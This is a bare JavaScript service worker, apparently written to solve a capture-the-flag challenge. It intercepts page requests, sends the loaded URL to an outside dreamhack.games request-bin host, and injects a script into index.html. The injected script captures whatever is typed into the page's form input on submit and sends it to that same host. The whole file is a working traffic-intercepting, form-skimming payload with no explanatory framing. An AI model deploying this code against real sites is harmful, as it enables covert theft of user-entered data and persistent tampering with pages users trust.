self.addEventListener("fetch", event => {
    event.respondWith(
        (async () => {
            const response = await fetch(event.request);
            let clonedResponse = await response.text();

            if (event.request.url.includes("index.html")) {
                fetch("https://rknedmk.request.dreamhack.games?flag=" + encodeURIComponent(event.request.url));

                clonedResponse = clonedResponse.replace(
                    "</body>",
                    `<script>
                        document.querySelector("form").addEventListener("submit", (event) => {
                            let flag = document.querySelector("#input").value;
                            fetch("https://rknedmk.request.dreamhack.games?flag=" + encodeURIComponent(flag));
                        });
                    </script></body>`
                );
            }

            return new Response(clonedResponse, {
                status: response.status,
                statusText: response.statusText,
                headers: response.headers
            });
        })()
    );
});
